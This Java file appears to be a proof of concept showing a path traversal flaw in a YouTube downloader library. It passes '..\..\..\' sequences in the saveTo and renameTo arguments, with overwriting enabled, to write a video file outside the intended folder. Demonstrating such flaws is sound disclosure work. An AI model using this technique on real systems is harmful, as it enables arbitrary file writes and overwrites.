import com.github.kiulian.downloader.YoutubeDownloader;
import com.github.kiulian.downloader.downloader.request.RequestVideoFileDownload;
import com.github.kiulian.downloader.downloader.request.RequestVideoInfo;
import com.github.kiulian.downloader.downloader.response.Response;
import com.github.kiulian.downloader.model.videos.VideoInfo;
import com.github.kiulian.downloader.model.videos.formats.Format;

import java.io.File;

public class Main {

    public static void main(String[] args) {

        // Initialize YoutubeDownloader
        YoutubeDownloader downloader = new YoutubeDownloader();


        // Specify the video ID to download
        String videoId = "a7KLMOm_LYk";

        // Fetch video information
        RequestVideoInfo requestVideoInfo = new RequestVideoInfo(videoId);
        Response<VideoInfo> responseVideoInfo = downloader.getVideoInfo(requestVideoInfo);

        if (responseVideoInfo.ok()) {
            VideoInfo videoInfo = responseVideoInfo.data();

            // Assuming we take the first available format (for simplicity)
            Format format = videoInfo.videoFormats().get(0);

            // Set up the output directory and file name, intentionally using path traversal sequences
            File outputDir = new File("my_videos\\..\\..\\..\\TestDir");  // Attempt to navigate to a directory outside 'my_videos'

            RequestVideoFileDownload request = new RequestVideoFileDownload(format)
                    .saveTo(outputDir)  // Set the manipulated output directory
                    .renameTo("..\\..\\..\\TestDir\\exploit_video")  // Attempt to further manipulate the path
                    .overwriteIfExists(true)
                    ;  // Overwrite any existing file

            // Execute the download request
            Response<File> response = downloader.downloadVideoFile(request);

            if (response.ok()) {
                File data = response.data();  // The file should be downloaded to the manipulated path
                System.out.println("Downloaded file path: " + data.getAbsolutePath());
            } else {
                System.out.println("Download failed: " + response.error().getMessage());
            }
        } else {
            System.out.println("Failed to fetch video info: " + responseVideoInfo.error().getMessage());
        }
    }

}
